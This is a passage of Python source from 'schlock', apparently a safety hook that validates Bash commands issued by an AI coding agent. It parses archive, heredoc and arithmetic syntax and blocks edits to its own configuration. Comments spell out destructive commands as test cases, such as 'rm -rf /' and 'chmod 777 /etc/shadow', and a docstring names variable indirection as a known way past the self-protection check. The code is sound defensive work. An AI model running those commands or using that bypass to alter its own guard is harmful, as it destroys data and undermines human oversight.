# `-t` as list mode. Over-listing only ever skips a filename (harmless); under-listing a
# read-mode value can only fail closed, since an extract mode is checked first.
_TAR_LONG_WITH_ARG = frozenset(
    {
        "file", "directory", "exclude", "exclude-from", "exclude-tag", "transform", "xform",
        "files-from", "label", "owner", "group", "mode", "blocking-factor", "record-size",
        "use-compress-program", "newer", "after-date", "one-top-level",
    }
)  # fmt: skip
# tar modes that never write into the -C directory (list / create / compare / append / update / concat).
_TAR_READ_MODES = frozenset("tcdruA")
_TAR_READ_LONG = frozenset({"list", "create", "diff", "compare", "append", "update", "catenate", "concatenate", "delete"})
_UNZIP_ARG_OPTS = frozenset("dPxO")
_UNZIP_READ_OPTS = frozenset("cltpvzZ")  # list, test, stdout, comment, zipinfo


def _short_flags(args: list[str], arg_opts: frozenset[str]) -> set[str]:
    """Letters of the short-option clusters in args, skipping each option's argument.

    A cluster ends at an option that takes an argument ("-Cdir"); when that option ends the
    cluster ("-C dir", "-P pw"), the next word is its value and is skipped, so a value such as
    the `-l` in "-P -l" is never mistaken for a mode letter.
    """
    flags: set[str] = set()
    i = 0
    while i < len(args):
        word = args[i]
        if word.startswith("-") and not word.startswith("--") and len(word) > 1:
            j = 1
            while j < len(word):
                ch = word[j]
                flags.add(ch)
                if ch in arg_opts:
                    if j == len(word) - 1:
                        i += 1  # value is the next word
                    break
                j += 1
        i += 1
    return flags


def _tar_modes(args: list[str]) -> set[str]:
    """Mode tokens that are real options — short letters and `--long` names, values skipped.

    Skipping option values (short and long) is what stops an option's argument (`--exclude -t`,
    `-f -t`) from being read as a mode.
    """
    modes: set[str] = set()
    i = 0
    first = True
    while i < len(args):
        word = args[i]
        if word.startswith("--"):
            name = word[2:].split("=", 1)[0]
            modes.add("--" + name)
            if "=" not in word and name in _TAR_LONG_WITH_ARG:
                i += 1  # value is the next word
        elif word.startswith("-") and len(word) > 1:
            j = 1
            while j < len(word):
                ch = word[j]
                modes.add(ch)
                if ch in _TAR_ARG_OPTS:
                    if j == len(word) - 1:
                        i += 1
                    break
                j += 1
        elif first and word and word[0].isalpha():
            modes.update(word)  # old-style key letters: "tar xf a.tar"
        first = False
        i += 1
    return modes


def _tar_extracts(args: list[str]) -> bool:
    """True unless tar visibly runs a mode that cannot write into its -C directory.

    Inverted on purpose: an invocation with no visible mode (supplied via TAR_OPTIONS, or an
    abbreviated long option) counts as an extraction. A valid tar always names a mode, so this
    only costs verdicts on commands that would fail anyway. A visible extract mode outranks a
    read-mode letter, because a read letter can appear as an unskipped option value.
    """
    modes = _tar_modes(args)
    longs = {m[2:] for m in modes if m.startswith("--")}
    if "x" in modes or any(name.startswith(("ext", "ge")) for name in longs):  # -x / --extract / --get
        return True
    if longs & _TAR_READ_LONG:
        return False
    return not ({m for m in modes if not m.startswith("--")} & _TAR_READ_MODES)


def _names_config_dir(arg: str) -> bool:
    """True if a single argument resolves to a path inside a config directory.

    Normalises before matching so that a quoted, escaped, or dot/double-slash spelling of the
    same runtime path ("-C'.claude'/hooks", ".claude//hooks", ".claude/./hooks") cannot slip the
    literal match. normpath does no filesystem access; `~`/`$VAR` are left as text, which the
    (?:^|/) boundary still anchors.
    """
    arg = _OPTION_PREFIX_RE.sub("", arg, count=1)
    arg = arg.replace('"', "").replace("'", "").replace("`", "").replace("\\", "").strip("(){}")
    if not arg:
        return False
    return bool(_CONFIG_DIR_RE.search(posixpath.normpath(arg)))


def _extracts_into_config_dir(command: str) -> bool:
    """Detect an archive extraction (tar/bsdtar, unzip, 7z) that names a config directory.

    The extractor must be the command word of a segment (after env assignments and pass-through
    wrappers such as sudo), so a config dir named as an *argument* to some other command
    (`grep tar .claude/hooks`) is not mistaken for an extraction. Any of the extractor's own
    arguments naming the dir counts — the target option ("-C dir", "--directory=dir", "-d dir",
    "-odir") and a member filter alike ("tar -xf a.tar .claude/hooks" recreates the dir under
    the cwd) — but redirection targets do not.
    """
    if ".claude" not in command and "schlock" not in command:
        return False
    for raw in _ARCHIVE_SEGMENT_SPLIT_RE.split(command):
        words = _ARCHIVE_ENV_ASSIGN_RE.sub("", raw.strip()).split()
        k = 0
        while k < len(words) and words[k].rsplit("/", 1)[-1] in _EXTRACT_WRAPPERS:
            k += 1
        if k >= len(words):
            continue
        name = words[k].strip("\"'`(){}").rsplit("/", 1)[-1]
        args: list[str] = []
        skip = False
        for word in words[k + 1 :]:
            if skip:
                skip = False
                continue
            if _REDIRECT_RE.match(word):
                skip = word[-1] in "<>"  # bare operator: its target is the next word
                continue
            args.append(word)
        if name in _TAR_NAMES:
            extracts = _tar_extracts(args)
        elif name == "unzip":
            extracts = not (_short_flags(args, _UNZIP_ARG_OPTS) & _UNZIP_READ_OPTS)
        elif name in _7Z_NAMES:
            command_word = next((arg for arg in args if not arg.startswith("-")), "")
            extracts = command_word.lower() in ("x", "e")
        else:
            continue
        if extracts and any(_names_config_dir(arg) for arg in args):
            return True
    return False


def _check_self_protection(command: str) -> Optional[ValidationResult]:
    """Allowlist-based check preventing modification of schlock configuration files.

    SECURITY CRITICAL: Uses an allowlist approach — when a config path is detected
    in a command, only known read-only commands are permitted. All other commands
    are blocked. This prevents bypass via obscure write commands (ln, dd, rsync, etc.)
    that a denylist would miss.

    Defense-in-depth: This is layer 2 of 3. Even if YAML rules (layer 1) are corrupted
    or the hook file_path check (layer 3) is bypassed, this hardcoded check blocks
    config tampering.

    Known limitation: Variable indirection (e.g., f=config.yaml; rm "$f") can bypass
    this check because the expanded path doesn't appear in the command string. Mitigated
    by YAML rule matching and hook-level file_path checks.

    Args:
        command: Command string to check

    Returns:
        ValidationResult blocking the command if it targets schlock config, None otherwise
    """
    # Check 0: archive extraction into a config directory. Runs before the fast path because
    # the command names only the directory, never the config file.
    if _extracts_into_config_dir(command):
        return _make_self_protection_result(command)

    # Fast path: skip if command doesn't reference any config path
    if not _matches_protected_path(command):
        return None

    # Check 1: Block any redirect operators (> or >>) targeting config files
    for pattern in _SELF_PROTECTION_REDIRECT_PATTERNS:
        if pattern.search(command):
            return _make_self_protection_result(command)

    # Check 2: Allowlist — verify all commands touching config paths are read-only
    # NOTE: Uses regex splitting rather than bashlex AST parsing. This is intentional:
    # - Self-protection runs pre-parse on the hot path; AST adds ~5ms latency
    # - AST parsing can itself fail, requiring fallback logic
    # - The allowlist approach already handles known bypass constructs:
    #   * Subshells: $(cmd) → first word is "$(cmd", not in allowlist → BLOCKED
    #   * eval: eval "rm ..." → "eval" not in allowlist → BLOCKED
    #   * Quoting: config path must appear as literal string for fast-path trigger
    # - Only variable indirection (f=config; rm "$f") bypasses this check,
    #   which AST parsing also can't solve (bashlex doesn't resolve variables).
    #   Mitigated by YAML rules (layer 1) and hook file_path checks (layer 3).
    segments = _SEGMENT_SPLIT_RE.split(command)
    for raw_segment in segments:
        segment = raw_segment.strip()
        if not segment:
            continue
        # Strip leading environment variable assignments (e.g., "DUMMY=1 FOO=bar rm ...")
        # These prefix a command but don't change what it does — the command after them
        # is what matters. If ONLY assignments remain, it's a pure assignment (skip).
        stripped = re.sub(r'^([A-Za-z_]\w*=(?:"[^"]*"|\'[^\']*\'|\S*)\s+)+', "", segment)
        if not stripped:
            continue
        # Only check segments that reference a config path
        if not _matches_protected_path(segment):
            continue
        # Extract command name (first word, strip path prefix)
        words = stripped.split()
        if not words:
            continue
        cmd = words[0].rsplit("/", 1)[-1]
        if cmd not in _SELF_PROTECTION_READ_ALLOWLIST:
            return _make_self_protection_result(command)
        # Even if cmd is allowlisted, block if segment contains process substitution
        # >(cmd) or <(cmd) — these can hide arbitrary commands inside an allowed outer command
        if re.search(r"[<>]\s*\(", segment):
            return _make_self_protection_result(command)

    return None


def _make_self_protection_result(command: str) -> ValidationResult:
    """Create a BLOCKED ValidationResult for self-protection violations."""
    logger.warning(f"Self-protection: blocked config modification attempt: {command[:100]}")
    return ValidationResult(
        allowed=False,
        risk_level=RiskLevel.BLOCKED,
        message="BLOCKED: Modification of schlock safety configuration is not allowed",
        alternatives=[
            "Edit schlock configuration manually outside of Claude Code",
            "Use /schlock:setup to configure schlock interactively",
        ],
        exit_code=1,
        error=None,
        matched_rules=["self_protection:config_write"],
    )


def _check_special_cases(command: str) -> Optional[ValidationResult]:
    """Check special cases that require dynamic state inspection.

    Special cases are commands that can't be validated by static rules alone
    and require checking system state (e.g., git status for uncommitted changes).

    Returns None if no special case applies (continue normal validation).
    Returns ValidationResult if special case is triggered.

    Args:
        command: Command string to check

    Returns:
        ValidationResult if special case triggered, None otherwise
    """
    # SELF-PROTECTION: Prevent LLM from modifying schlock's own configuration
    # This is a hardcoded backstop that runs BEFORE YAML rule matching and
    # cannot be bypassed via rule_overrides or category_overrides.
    self_protection = _check_self_protection(command)
    if self_protection is not None:
        return self_protection

    # Git reset --hard protection: check for uncommitted changes
    if "git reset" in command and "--hard" in command:
        try:
            # Run git status --porcelain to check for uncommitted changes
            result = subprocess.run(
                ["git", "status", "--porcelain"],
                capture_output=True,
                text=True,
                timeout=5,
                check=False,
            )

            # If git status succeeded and has output, there are uncommitted changes
            if result.returncode == 0 and result.stdout.strip():
                logger.warning("Blocked git reset --hard due to uncommitted changes")
                return ValidationResult(
                    allowed=False,
                    risk_level=RiskLevel.BLOCKED,
                    message="BLOCKED: Uncommitted changes detected! git reset --hard will destroy them.",
                    alternatives=[
                        "Save changes first with 'git stash'",
                        "Commit changes before resetting",
                        "Use 'git reset --soft' to keep changes in working directory",
                    ],
                    exit_code=1,
                    error=None,
                )

        except subprocess.TimeoutExpired:
            logger.warning("git status timeout during reset --hard check")
            # Fail-safe: block if we can't verify safety
            return ValidationResult(
                allowed=False,
                risk_level=RiskLevel.BLOCKED,
                message="BLOCKED: Unable to verify git status (timeout). Reset --hard blocked for safety.",
                alternatives=["Verify git repository state manually"],
                exit_code=1,
                error="git status timeout",
            )

        except FileNotFoundError:
            # Git not installed or not in PATH - not a git repo
            # Let normal validation handle this
            pass

        except Exception as e:
            logger.debug(f"git status check failed (not a git repo?): {e}")
            # Not a git repo or other error - let normal validation handle it
            pass

    # No special case triggered
    return None


def _match_original_and_reconstructed(
    engine: "RuleEngine",
    parser: "BashCommandParser",
    command: str,
    ast_nodes: list,
    string_literals: list[tuple],
    quote_source: str,
    heredoc_ranges: Optional[list[tuple]] = None,
) -> RuleMatch:
    """Match `command` against the rules as written AND quote/escape-stripped.

    SECURITY CRITICAL: bashlex resolves escapes and drops quote characters when
    it reconstructs a command from its AST, so `rm\\ -rf\\ /` and `"chmod" 777`
    only reveal themselves to the regex rules in reconstructed form. Both passes
    always run and the higher risk wins; the reconstructed pass used to be
    skipped whenever the command held a quoted token, which is what made
    `"chmod" 777 /etc/shadow` classify SAFE. See
    BashCommandParser.reconstruct_command_with_suppression_ranges for why
    rebasing the ranges is what makes always-on affordable.

    Centralising this is deliberate: the multi-segment branch had simply
    forgotten the reconstructed pass, so one call site is the fix's habitat.

    Args:
        engine: Rule engine to match against
        parser: Parser used to reconstruct the command from its AST
        command: Command (or single segment) to match
        ast_nodes: Parsed AST for `command`
        string_literals: Literal ranges for `command`. Required, not defaulted:
                         this function cannot derive them once `quote_source` is
                         in play, because the caller's spans may index a
                         different string than `command`. An explicit `[]`
                         switches suppression off, which is the shape of the bug
                         this function exists to fix - so it has to be a decision
                         the caller states, never one taken by omission.
        quote_source: The string `ast_nodes`' word spans index into. Equal to
                      `command` for a whole command; for a segment validated
                      under parse-once the node comes from the PARENT parse, so
                      its spans address the whole command instead.
                      _quoting_is_load_bearing reads quote characters positionally
                      out of whatever string it is handed, so the wrong one makes
                      it report "not quoted" where the source is quoted, and the
                      reverse - the second of which is an under-block. Required
                      for that reason: a forgotten argument is a TypeError here,
                      not a silent wrong answer. Only quote detection uses it; the
                      ranges returned are offsets into the reconstruction, which
                      is built from `ast_nodes` alone either way.
        heredoc_ranges: Heredoc ranges for the original-form pass only: heredoc
                        bodies never reach the reconstruction, since
                        _collect_words walks `.word` parts alone.

    Returns:
        The higher-risk of the two matches.
    """
    match = engine.match_command(
        command,
        string_literals=string_literals,
        heredoc_ranges=heredoc_ranges,
    )

    reconstructed, suppression_ranges = parser.reconstruct_command_with_suppression_ranges(quote_source, ast_nodes)
    if reconstructed and reconstructed != command:
        recon_match = engine.match_command(reconstructed, string_literals=suppression_ranges)
        if recon_match.risk_level > match.risk_level:
            return recon_match

    return match


# The rewrite emits its own delimiter rather than reusing the real one, which
# can legally contain whitespace or metacharacters (`<<'A;B'`) that would change
# the surrounding command's structure once unquoted.
_HEREDOC_PLACEHOLDER = "SCHLOCK_HEREDOC"

# Strips the rewritten heredoc back off a segment: the redirection, and the
# placeholder body the segment carries with it (LAB-1732 made a segment the
# whole command bash runs, terminator included, so the redirection alone no
# longer accounts for all of it). Exact rather than a guess, because the
# rewrite chose both this delimiter and this body itself.
#
# Neither branch may swallow a blank a backslash escapes. In front of the
# redirection that blank is an argument (`cat \ <<'EOF'`), and in front of the
# carried blob it is the segment's own last argument (`cat <<'EOF' \ `);
# taking either leaves a dangling `cat \` that parses nowhere (LAB-4126).
#
# That is also why the second branch carries no `\s*` in front of its newline.
# _close_heredocs appends its blob starting WITH a `\n`, and on this path the
# body is always blank (_neuter_heredocs stands one empty line in for it), so
# the match already begins at the blob's first character. An `\s*` there could
# only reach backwards, into the command's own escaped blank.
#
# The second branch is anchored to the end of the segment because that is where
# _close_heredocs put the blob - one run per heredoc, nothing after it. Unanchored
# it would also delete a `SCHLOCK_HEREDOC` the CALLER wrote: the placeholder is a
# fixed public string, and `rm \<newline>SCHLOCK_HEREDOC\<newline> -rf /` is one
# command to bash, so deleting that token mid-segment rejoins `rm` to `-rf /`
# having torn the text the rules match on apart. Anchoring keeps this exact, which
# is what the paragraph above claims it is.
_HEREDOC_REDIRECT_RE = re.compile(
    rf"(?:(?<!\\)\s+)?<<-?{re.escape(_HEREDOC_PLACEHOLDER)}|(?:\n\s*{re.escape(_HEREDOC_PLACEHOLDER)})+\s*\Z"
)

# Bash ends an unquoted word at a blank or an operator character.

# `#` opens a comment only at the start of a word, which is anywhere a bash
# metacharacter just ended one. Omitting `)` made `(echo hi)#<<Q` read as an
# opener that bash - and bashlex - both read as a comment.
_WORD_START_AFTER = frozenset(" \t;&|()<>")

# Inside a parameter or arithmetic expansion, `<<` is never a redirection:
# `${x:-a<<b}` expands to the literal `a<<b`, `$((1<<2))` and `(( 1<<2 ))` are
# left shifts, `a[1<<2]=x` is a subscript. Quotes are the same kind of state one
# step further: bash nests them inside an expansion, so `"${x:-"<<ZZ "}"` is one
# word and the inner `"` does NOT end the outer string.
#
# Modelling quotes and expansions as separate variables made the two blind to
# each other, and the `<<` right after a mis-read closing quote became a phantom
# heredoc opener whose body deleted real commands before validation (LAB-4270).
# So there is ONE stack of the closers still owed, and `<<` opens a heredoc only
# when it is empty. Frames: `'`, `$'`, `"`, `` ` ``, `}`, `)`, `]`.
#
# Only `(` and `[` deepen their own frame - `$(( ((1))<<2 ))` ends at the last
# `)`, `$[arr[1]<<2]` at the last `]`. A bare `{` deliberately does NOT: bash
# ends a `${…}` at the first unmatched `}` whatever braces the text holds, so
# `${x:-{a}<<c` really does open a heredoc (verified). Adding `"}": "{"` here
# is the obvious-looking fix and it would miss that opener; a nested `${`
# extends the frame by pushing its own closer, which is all that is needed.
_EXPANSION_NESTS_ON = {")": "(", "]": "["}

# What each opener owes, longest first so `$((` is never read as `$(`.
_EXPANSION_FRAMES = (("$((", "))"), ("${", "}"), ("$[", "]"))

# Every frame above starts with one of these, so the scan only probes on them.
# A double-quoted span is otherwise the whole line, one probe per character.
_FRAME_START_CHARS = frozenset("$`")

# Bash reads `name[…]` as an array subscript - one word to its `]` however many
# lines away - only where an assignment is acceptable: at the start of a
# command, after another assignment, after a reserved word, or after nothing
# but redirections since the command began (parse.y `assignment_acceptable`:
# `last_read_token == ASSIGNMENT_WORD || PST_REDIRLIST || reserved_word_acceptable`,
# every transition below checked against bash 5.3). Anywhere else `[` is a glob
# character, the word ends at the next blank, and `export a[1<<b]=1` opens a
# heredoc. The states, per command context:
#   FRESH    - the command has not begun, or only reserved words have been read
#   TIME     - the last word was `time`, so `-p` is its option; TIMEP after that,
#              so `--` is too. Anywhere else both are command words.
#   REDIR    - nothing but redirections since the command began (PST_REDIRLIST):
#              an assignment may follow, a reserved word is a command
#              (`> f if a[0]=1` is a syntax error, `> f time a[0]=1` runs `time`)
#   ASSIGNED - the last word was an assignment. A reserved word here is a
#              command (`x=1 { a[0]=1` runs `{`), and so is `time`.
#   COPROC   - the last word was `coproc`; the next one is a NAME or a command
#   NAMED    - `coproc NAME` has been read: an assignment or a reserved word may
#              follow (`coproc NAME { a[0]=1; }`), a redirection ends it
#   LOST     - a command word has been read; nothing after it is a subscript
# A redirection ends ASSIGNED (`x=1 > f a[0]=1` runs `a[0]=1` as a command) and
# otherwise leads to REDIR; one whose target is the next word keeps the state
# through that word. Inside a compound assignment `x=( … )` every word may
# carry a subscript, a bare `[k]=v` included (PST_COMPASSIGN), whatever the
# state.
_FRESH, _TIME, _TIMEP, _REDIR, _ASSIGNED, _COPROC, _NAMED, _LOST = (
    "fresh",
    "time",
    "time -p",
    "redir",
    "assigned",
    "coproc",
    "coproc NAME",
    "lost",
)
_RESERVED_WORDS = frozenset(("if", "then", "elif", "else", "while", "until", "do", "!", "{"))
_ASSIGNMENT_WORD_RE = re.compile(r"[A-Za-z_]\w*(\[.*\])?\+?=", re.DOTALL)  # `x=`, `a[1]=`, `x+=`, quotes and all after
_REDIRECT_WORD_RE = re.compile(r"([0-9]*|\{[A-Za-z_]\w*\})[<>]|&>")  # `<`, `2>`, `{fd}>`, `&>`, `<<'E'`, `<<<`
# What a word may hold and still absorb a following `<` or `>`: an fd prefix,
# or the first character of a two-character operator (`>>`, `<>`, `&>>`).
_FD_RE = re.compile(r"([0-9]*|\{[A-Za-z_]\w*\}|&)[<>]?")
# `2>&-` closes the descriptor: the `-` is the whole target even glued, so
# `2>&-a[0]=1` is a redirection and then an assignment (verified).
_FD_CLOSE_RE = re.compile(r"([0-9]*|\{[A-Za-z_]\w*\})[<>]&")
_ASSIGNMENT_PREFIX_RE = re.compile(r"[A-Za-z_]\w*(\[.*\])?\+?=", re.DOTALL)  # `x=(…)` opens a compound assignment
_IDENTIFIER_RE = re.compile(r"[A-Za-z_]\w*")
# Blanks and control-operator characters end a word at the top level. `<` and
# `>` end one too, unless the word so far is an fd prefix (`2>&1`, `{fd}>`);
# `&` and `|` are part of the word when they extend a redirection operator
# (`>&`, `&>`, `>|`). See `_is_word_boundary`.
_WORD_BOUNDARY = frozenset(" \t;|&()")

# What bash's `((` matcher stops on, per lexical context it recurses into.
# These are parse_matched_pair and parse_comsub in parse.y, pinned against bash
# 5.3: at the bare paren level `${…}` and `#` are text, so a `)` inside either
# closes the pair; inside quotes, `${…}` and `$(…)` nest; a `$(…)` re-lexes as
# shell, where `#` opens a comment and `${…}` nests again.
_PAREN_STOP_RE = re.compile(r"[()'\"`\\]|\$['\"(]")
_COMSUB_STOP_RE = re.compile(r"[()'\"`\\#]|\$['\"({]|<<|case(?=[ \t\n])")
_DOLBRACE_STOP_RE = re.compile(r"[}'\"`\\]|\$['\"({]")
_DQUOTE_STOP_RE = re.compile(r"[\"`\\]|\$[({]")
_NEWLINE_RE = re.compile("\n")
# The spans with no nesting at all: `'…'` has no escapes; `$'…'` and a backtick
# honour a backslash before their own closer.
_OPAQUE_SPANS = {
    "'": (re.compile("'"), "`'`"),
    "$'": (re.compile(r"['\\]"), "`$'`"),
    "`": (re.compile(r"[`\\]"), "backtick"),
}
# Where `#` opens a comment and `case` is a keyword inside a `$(…)`: the same
# places a word can start, plus the newline a comment ends on.
_COMMENT_START_AFTER = _WORD_START_AFTER | frozenset("\n")


class _DoubleParen:
    """Resolve each top-level `((` the way bash's parser does.

    Bash does not decide `((` by looking at the line. It reads the `(` pair as
    a matched pair and, if the balancing `)` is immediately followed by another
    `)`, the whole thing is an arithmetic command; otherwise it re-reads the same
    text as two subshells. So `(( 1<<b ))` is a shift even when the `))` is on
    a later line, `((cd /tmp) && cat <<'EOF'` is a subshell and its heredoc is
    real, and `((echo "))")` is not closed by the quoted parens. Deciding from
    `"))" in line` got each of those wrong in one direction or the other; the
    wrong one for `(( … ))` across a newline read `<<b` as a heredoc opener
    whose body deleted the commands that followed (LAB-4270).

    What is opaque to the matcher depends on where it is. At the paren level a
    quote, a backslash, a backtick or a `$(…)` is opaque and `${…}` is not -
    `(( ${x:-)} + 1 ))` is two subshells. Inside `"…"` both `${…}` and `$(…)`
    nest and quotes nest inside them, so `(( "$(echo "x)")" + 1 ))` is one
    word and arithmetic. Inside `$(…)` the text is shell again: `#` opens a
    comment, `${…}` nests. A flat "skip to the closing quote" got every one of
    those wrong in the fail-open direction.

    ``partners`` memoises where each paren-level `(` closes, so nested `((`
    never rescan: `(( (( (( x ) ) ) ) ) )` is otherwise quadratic in the
    nesting depth, on a hook that runs before every Bash call.
    """

    def __init__(self, text: str) -> None:
        self.text = text
        self.partners: dict[int, int] = {}

    def is_arithmetic(self, pos: int) -> bool:
        """True when the `((` at ``pos`` is an arithmetic command, False when it is two subshells.

        Raises:
            ParseError: the text ends before the pair closes, or nests a
                construct this cannot follow. Bash reports `unexpected EOF
                while looking for matching ')'` and runs nothing in the first
                case; in the second there is no reading to vouch for.
        """
        close = self.partners.get(pos + 1)
        if close is None:
            try:
                close = self._paren(pos + 1)
            except RecursionError:
                raise ParseError("Quoting nested too deep inside `((` to follow") from None
        return self.text.startswith(")", close + 1)

    def _paren(self, opening: int) -> int:
        """Offset of the `)` balancing the paren-level `(` at ``opening``, recording every pair passed."""
        stack = [opening]
        pos = opening + 1
        while stack:
            found = self._stop(_PAREN_STOP_RE, pos, "`((`")
            hit, pos = found.group(), found.end()
            if hit == "(":
                stack.append(found.start())
            elif hit == ")":
                self.partners[stack.pop()] = found.start()
            else:
                pos = self._skip(hit, found.start(), pos)
        return self.partners[opening]

    def _comsub(self, start: int) -> int:
        """Offset just past the `)` closing the `$(` whose `(` is at ``start``.

        The body is shell: a `#` at a word start comments to end of line, and a
        `case` pattern's `)` or a heredoc inside would need a real parser, so
        both refuse rather than guess.
        """
        depth = 0
        pos = start + 1
        while True:
            found = self._stop(_COMSUB_STOP_RE, pos, "`$(`")
            hit, pos = found.group(), found.end()
            if hit == "(":
                depth += 1
            elif hit == ")":
                if depth == 0:
                    return pos
                depth -= 1
            elif hit in ("#", "case"):
                if found.start() > start + 1 and self.text[found.start() - 1] not in _COMMENT_START_AFTER:
                    continue  # mid-word: `echo a#b`, `test-case`
                if hit == "case":
                    raise ParseError("`case` inside `$(…)` inside `((`; its patterns' `)` cannot be told from the closer")
                pos = self._stop(_NEWLINE_RE, pos, "`$(`").end()
            elif hit == "<<":
                if self.text.startswith("<", pos):
                    continue  # a here-string is a word
                raise ParseError("a heredoc inside `$(…)` inside `((`; the closing paren cannot be located")
            else:
                pos = self._skip(hit, found.start(), pos)

    def _dolbrace(self, pos: int) -> int:
        """Offset just past the first `}` not inside a nested quote or substitution."""
        while True:
            found = self._stop(_DOLBRACE_STOP_RE, pos, "`${`")
            hit, pos = found.group(), found.end()
            if hit == "}":
                return pos
            pos = self._skip(hit, found.start(), pos)

    def _dquote(self, pos: int) -> int:
        """Offset just past the `"` closing a double-quoted span; `$(…)`, `${…}` and backticks nest."""
        while True:
            found = self._stop(_DQUOTE_STOP_RE, pos, '`"`')
            hit, pos = found.group(), found.end()
            if hit == '"':
                return pos
            pos = self._skip(hit, found.start(), pos)

    def _skip(self, hit: str, start: int, after: int) -> int:
        """Skip the span ``hit`` opens at ``start`` - opaque or nested; return the offset past it."""
        if hit == "\\":
            return after + 1
        if hit == "$(":
            # `$((…))` is arithmetic, read like the enclosing pair; `$(…)` is shell.
            return self._paren(start + 1) + 1 if self.text.startswith("(", start + 2) else self._comsub(start + 1)
        if hit in ('"', '$"'):
            return self._dquote(after)
        if hit == "${":
            return self._dolbrace(after)
        stop, what = _OPAQUE_SPANS[hit]
        return self._escaped_span(stop, after, what)

    def _escaped_span(self, stop: "re.Pattern[str]", pos: int, what: str) -> int:
        """Offset just past the closer of a span; a backslash escapes the next character where ``stop`` says so."""
        while True:
            found = self._stop(stop, pos, what)
            if found.group() != "\\":
                return found.end()
            pos = found.end() + 1

    def _stop(self, pattern: "re.Pattern[str]", pos: int, what: str) -> "re.Match[str]":
        found = pattern.search(self.text, pos)
        if found is None:
            raise ParseError(f"{what} never closes; bash reads no command from this text")
        return found


def _expansion_frame_at(line: str, pos: int, nested: bool) -> Optional[tuple[str, str]]:
    """The expansion opening at ``pos`` as ``(text, closers owed)``, or None.

    ``nested`` - some frame is already open - widens the set by two. Inside any
    frame nothing can open a heredoc, so tracking `$(…)` and `` `…` `` there is
    free, and it is the only way to find which closer really ends the enclosing
    frame: the `}` in `${x:-$(echo })<<ZZ }` belongs to the substitution, and
    popping the `${…}` on it re-arms the very phantom opener this exists to
    prevent. At the top level both re-lex as shell and a heredoc inside them is
    real (`x=$(cat <<'E' … E)`), so they stay untracked and their openers are
    found.
    """
    for opener, owed in _EXPANSION_FRAMES:
        if line.startswith(opener, pos):
            return opener, owed
    if nested:
        return ("$(", ")") if line.startswith("$(", pos) else ("`", "`") if line[pos] == "`" else None
    return None


def _open_context_name(scan: "_ScanState") -> str:
    """What the innermost still-open command context is, for a refusal message.

    Naming the wrong construct sends the reader to the wrong part of the line,
    which is why this reads the opener each context recorded rather than
    inferring one from `comsub`: `<(` and `>(` set the same flag as `$(`.
    """
    return scan.contexts[-1].opener


def _is_word_boundary(line: str, pos: int) -> bool:
    """True when the character at ``pos`` ends a top-level word.

    `&` and `|` are control operators except where they extend a redirection
    operator - `2>&1`, `>&`, `&>`, `>|` - and splitting them there turned
    `>& file a[…` into a redirection, an operator and a plain word.
    """
    char = line[pos]
    if char == "&":
        return not ((pos and line[pos - 1] in "<>") or line.startswith(">", pos + 1))
    if char == "|":
        return not (pos and line[pos - 1] == ">")
    return char in _WORD_BOUNDARY


def _command_state_after(state: str, word: str) -> tuple[str, bool]:  # noqa: PLR0911 - one return per transition
    """The command-position state after ``word``, and whether ``word`` owes a redirect target.

    The transitions are bash's (see `_FRESH`). `ENV="foo bar"` arrives as one
    word because the caller ends a word only at the top level, and `x=1>f`
    arrives as two because `>` ends a word - both things a whitespace split
    could not see.
    """
    if state == _LOST:
        return _LOST, False
    if _REDIRECT_WORD_RE.match(word) and not word.startswith(("<(", ">(")):  # a process substitution is a word
        owes_target = word[-1] in "<>" or word.endswith((">|", ">&", "<&"))
        return (_LOST, False) if state in (_ASSIGNED, _NAMED) else (_REDIR, owes_target)
    if _ASSIGNMENT_WORD_RE.match(word):
        return _ASSIGNED, False
    if state in (_ASSIGNED, _REDIR):
        return _LOST, False  # after an assignment or a redirection a reserved word is a command
    if word == "time":
        return _TIME, False
    if word == "-p" and state == _TIME:
        return _TIMEP, False
    if word == "--" and state in (_TIME, _TIMEP):
        return _FRESH, False
    if word == "coproc":
        return _COPROC, False
    if word in _RESERVED_WORDS:
        return _FRESH, False
    return (_NAMED, False) if state == _COPROC else (_LOST, False)


@dataclass
class _Context:
    """Command-position tracking for one command context - the top level, a `$(…)`, a compound assignment.

    ``prefix`` holds the open word's text from earlier lines (and, for a word
    that opened this context, the text before the opener); ``start`` where it
    continues on this line. ``comsub`` says the outer word resumes after this
    context's `)` (`x=$(…)y` is one word) rather than ending at it;
    ``compound`` that this is a `x=( … )`, where every word may carry a
    subscript. ``glob`` records a `[` in the open word that was not a
    subscript, so no later `[` in the same word is asked again. ``opener`` is
    the text that opened it, kept verbatim because several openers share
    ``comsub`` - `<(` and `>(` are not `$(` - and a refusal that names the wrong
    construct sends the reader to the wrong part of the line.
    """

    comsub: bool = False
    compound: bool = False
    backtick: bool = False
    opener: str = "$("
    serial: int = 0
    state: str = _FRESH
    target_pending: bool = False
    prefix: str = ""
    start: Optional[int] = None
    glob: bool = False

    def word(self, line: str, pos: int) -> str:
        return self.prefix + line[self.start : pos]  # type: ignore[misc]  # callers check start first

    def opens_subscript(self, line: str, pos: int) -> bool:
        """Whether a `[` at ``pos`` starts an array subscript here."""
        if self.glob or self.target_pending:
            return False
        if self.compound and (self.start is None or self.start == pos):
            return True  # `x=( [k]=v )`
        if self.state == _LOST and not self.compound or self.start is None:
            return False
        if self.prefix:
            return _IDENTIFIER_RE.fullmatch(self.word(line, pos)) is not None
        return _IDENTIFIER_RE.fullmatch(line, self.start, pos) is not None

    def end_word(self, line: str, pos: int) -> None:
        if self.start is None:
            return
        word = self.word(line, pos)
        if self.target_pending:
            self.target_pending = False  # a redirection's target is neither a command nor an assignment
        elif word == "case" and self.comsub and not self.compound and self.state != _LOST:
            # A pattern's `)` would be read as this context's closer. The
            # matcher for `((` refuses that shape for the same reason, though
            # no longer on the same terms: it stops at any `case` a word could
            # start, so it still refuses the compound case carved out here and
            # over-blocks `(( $(x=(case a in a); echo ${#x[@]}) ))`, which bash
            # evaluates to 4. Fail-closed and one construct over; not widened
            # to match from here.
            # `not self.compound` because `comsub` says only that the outer word
            # resumes after the `)`, which `x=( … )` also does - and inside one
            # there are no commands, so no patterns: bash reads
            # `x=(case a in a) echo;; esac)` as a syntax error, not a `case`.
            # Without the guard `x=(case)` and `types=(case esac if)` refuse
            # valid shell. A `$(case …)` nested in one opens its own
            # non-compound context, so this still refuses that.
            raise ParseError("`case` inside `$(…)`; its patterns' `)` cannot be told from the closer")
        else:
            self.state, self.target_pending = _command_state_after(self.state, word)
        self.prefix, self.start, self.glob = "", None, False

    def fold(self, line: str, end: int) -> None:
        """Move the open word's text up to ``end`` into ``prefix``; it continues elsewhere."""
        if self.start is not None:
            self.prefix += line[self.start : end]
            self.start = None

    def operator(self) -> None:
